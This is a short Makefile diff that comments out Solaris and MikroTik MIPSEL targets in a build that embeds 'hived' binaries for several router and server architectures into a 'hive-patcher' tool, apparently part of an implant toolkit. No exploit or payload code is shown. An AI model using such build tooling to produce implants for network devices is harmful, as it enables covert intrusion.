@@ -93,12 +93,11 @@ OBJS =	main.o functions.o misc.o modes.o parser.o \
 
 LIBS = $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO)
 
-UNPATCHED_SOLARIS_SPARC = hived-solaris-sparc-unpatched
-UNPATCHED_SOLARIS_X86 = hived-solaris-x86-unpatched
+#UNPATCHED_SOLARIS_X86 = hived-solaris-x86-unpatched
 UNPATCHED_LINUX_X86 = hived-linux-x86-unpatched
 UNPATCHED_MIKROTIK_X86 = hived-mikrotik-x86-unpatched
 UNPATCHED_MIKROTIK_MIPS = hived-mikrotik-mips-unpatched
-UNPATCHED_MIKROTIK_MIPSEL = hived-mikrotik-mipsel-unpatched
+#UNPATCHED_MIKROTIK_MIPSEL = hived-mikrotik-mipsel-unpatched
 UNPATCHED_MIKROTIK_PPC = hived-mikrotik-ppc-unpatched
 UNPATCHED_UBIQUITI_MIPS = hived-ubiquiti-mips-unpatched
 
@@ -227,10 +226,9 @@ patcher: bin-links $(UNPATCHED_BINS)
 	xxd -i $(UNPATCHED_LINUX_X86) _unpatched_linux_x86.h
 	xxd -i $(UNPATCHED_MIKROTIK_X86) _unpatched_mikrotik_x86.h
 	xxd -i $(UNPATCHED_MIKROTIK_MIPS) _unpatched_mikrotik_mips.h
-	xxd -i $(UNPATCHED_MIKROTIK_MIPSEL) _unpatched_mikrotik_mipsel.h
+#	xxd -i $(UNPATCHED_MIKROTIK_MIPSEL) _unpatched_mikrotik_mipsel.h
 	xxd -i $(UNPATCHED_MIKROTIK_PPC) _unpatched_mikrotik_ppc.h
-	xxd -i $(UNPATCHED_SOLARIS_X86) _unpatched_solaris_x86.h
-	xxd -i $(UNPATCHED_SOLARIS_SPARC) _unpatched_solaris_sparc.h
+#	xxd -i $(UNPATCHED_SOLARIS_X86) _unpatched_solaris_x86.h
 	xxd -i $(UNPATCHED_UBIQUITI_MIPS) _unpatched_ubiquiti_mips.h
 
 	$(CC) $(CFLAGS) -I. $(STRINGS)/string_utils.c patcher.c -o hive-patcher $(LIBSSL)
